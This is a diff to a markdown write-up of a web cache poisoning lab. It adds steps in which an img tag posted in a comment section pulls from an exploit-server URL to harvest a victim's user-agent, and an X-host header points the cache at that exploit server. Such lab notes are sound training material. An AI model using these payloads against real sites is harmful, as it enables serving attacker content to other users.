@@ -54,12 +54,12 @@ This lab is vulnerable to web cache poisoning. A victim user will view any comme
 ```
 * Run param miner, x-host header detected
 
-* User-agent of the victim triggered with : 
+* User-agent of the victim triggered with (comment section) : 
 
 <img src="https://exploit-0a5a008c04375d26804d117001d9003b.exploit-server.net/exploit">
 
 > user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
 
- 
+ X-host: exploit-0ae700ad048a44c18279c8a901c90073.exploit-server.net
 
 ---
